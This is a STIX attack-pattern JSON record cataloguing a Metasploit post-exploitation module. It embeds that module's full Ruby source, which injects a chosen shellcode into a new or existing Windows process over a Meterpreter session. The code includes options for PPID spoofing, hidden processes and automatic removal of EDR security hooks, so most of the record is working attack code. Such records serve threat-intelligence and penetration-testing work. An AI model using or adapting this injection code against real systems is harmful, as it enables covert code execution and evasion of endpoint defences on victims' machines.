{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c068ab49-fd32-4326-bc4f-228347ab4a8c",
    "created": "2024-08-14T16:33:04.976339Z",
    "modified": "2024-08-14T16:33:04.976343Z",
    "name": "Windows Manage Memory Shellcode Injection Module",
    "description": " This module will inject into the memory of a process a specified shellcode.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/shellcode_inject.rb",
            "external_id": "shellcode_inject.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Memory Shellcode Injection Module',\n        'Description' => %q{\n          This module will inject into the memory of a process a specified shellcode.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'phra <https://iwantmore.pizza>' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_thread_create\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('SHELLCODE', [true, 'Path to the shellcode to execute']),\n        OptInt.new('PID', [false, 'Process Identifier of process to inject the shellcode. (0 = new process)', 0]),\n        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),\n        OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', false]),\n        OptBool.new('INTERACTIVE', [true, 'Interact with the process', false]),\n        OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),\n        OptBool.new('AUTOUNHOOK', [true, 'Auto remove EDRs hooks', false]),\n        OptInt.new('WAIT_UNHOOK', [true, 'Seconds to wait for unhook to be executed', 5]),\n        OptEnum.new('BITS', [true, 'Set architecture bits', '64', ['32', '64']])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    # syinfo is only on meterpreter sessions\n    print_status(\"Running module against #{sysinfo['Computer']}\") if !sysinfo.nil?\n\n    # Set variables\n    shellcode = File.binread(datastore['SHELLCODE'])\n    pid = datastore['PID']\n    ppid = datastore['PPID']\n    bits = datastore['BITS']\n    p = nil\n    if bits == '64'\n      bits = ARCH_X64\n    else\n      bits = ARCH_X86\n    end\n\n    # prelim check\n    if (client.arch == ARCH_X86) && (@payload_arch == ARCH_X64)\n      fail_with(Failure::BadConfig, 'Cannot inject a 64-bit payload into any process on a 32-bit OS')\n    end\n\n    if (datastore['PPID'] != 0) && (datastore['PID'] != 0)\n      print_error('PID and PPID are mutually exclusive')\n      return false\n    end\n\n    # Start Notepad if Required\n    if pid == 0\n      if (ppid != 0) && !has_pid?(ppid)\n        print_error(\"Process #{ppid} was not found\")\n        return false\n      elsif ppid != 0\n        print_status(\"Spoofing PPID #{ppid}\")\n      end\n\n      notepad_pathname = get_notepad_pathname(bits, client.sys.config.getenv('windir'), client.arch)\n      vprint_status(\"Starting  #{notepad_pathname}\")\n      proc = client.sys.process.execute(notepad_pathname, nil, {\n        'Hidden' => datastore['HIDDEN'],\n        'Channelized' => datastore['CHANNELIZED'],\n        'Interactive' => datastore['INTERACTIVE'],\n        'ParentPid' => datastore['PPID']\n      })\n      print_status(\"Spawned Notepad process #{proc.pid}\")\n    else\n      if datastore['CHANNELIZED'] && datastore['PID'] != 0\n        fail_with(Failure::BadConfig, \"It's not possible to retrieve output when injecting existing processes!\")\n      elsif datastore['CHANNELIZED'] && datastore['PPID'] != 0\n        fail_with(Failure::BadConfig, \"It's not possible to retrieve output when using PPID spoofing!\")\n      end\n      unless has_pid?(pid)\n        print_error(\"Process #{pid} was not found\")\n        return false\n      end\n      begin\n        proc = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)\n      rescue Rex::Post::Meterpreter::RequestError => e\n        print_error(e.to_s)\n        fail_with(Failure::NoAccess, \"Failed to open pid #{pid.to_i}\")\n      end\n      print_status(\"Opening existing process #{proc.pid}\")\n    end\n\n    # Check\n    if (bits == ARCH_X64) && (client.arch == ARCH_X86)\n      print_error('You are trying to inject to a x64 process from a x86 version of Meterpreter.')\n      print_error('Migrate to an x64 process and try again.')\n      return false\n    end\n    if arch_check(bits, proc.pid)\n      if datastore['AUTOUNHOOK']\n        print_status('Executing unhook')\n        print_status(\"Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...\")\n        unless inject_unhook(proc, bits, datastore['WAIT_UNHOOK'])\n          fail_with(Failure::BadConfig, 'Unknown target arch; unable to assign unhook dll')\n        end\n      end\n      begin\n        inject(shellcode, proc)\n      rescue ::Exception => e\n        print_error(\"Failed to inject Payload to #{proc.pid}!\")\n        print_error(e.to_s)\n      end\n    else\n      fail_with(Failure::BadConfig, 'Arch mismatch between shellcode and process!')\n    end\n  end\n\n  def inject(shellcode, proc)\n    mem = inject_into_process(proc, shellcode)\n    proc.thread.create(mem, 0)\n    print_good(\"Successfully injected payload into process: #{proc.pid}\")\n    if datastore['INTERACTIVE'] && datastore['CHANNELIZED'] && datastore['PID'] == 0\n      print_status('Interacting')\n      client.console.interact_with_channel(proc.channel)\n    elsif datastore['CHANNELIZED'] && datastore['PID'] == 0\n      print_status('Retrieving output')\n      data = proc.channel.read\n      print_line(data) if data\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}